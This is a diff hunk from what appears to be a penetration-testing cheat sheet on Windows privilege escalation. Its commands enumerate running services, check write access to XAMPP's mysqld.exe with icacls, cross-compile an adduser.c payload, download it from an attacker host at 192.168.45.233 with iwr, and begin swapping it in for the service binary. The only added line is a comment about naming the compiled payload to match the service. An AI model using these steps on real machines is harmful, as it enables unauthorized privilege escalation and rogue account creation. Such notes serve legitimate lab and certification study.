@@ -40,6 +40,7 @@ When you gain access to a windows user do steps bellow:
 
       Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} #enumerate running service and identify vulnerable service
       icacls "C:\xampp\mysql\bin\mysqld.exe" #to verify if we have permission to do the substitution of file
+      #Dowload, adjust and compile adduser.c, it'a important remembering that compilade exe name must be exactly same to enumerate vulberable exe service name 
       x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
       iwr -uri http://192.168.45.233:8000/adduser.exe -Outfile adduser.exe 
       move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
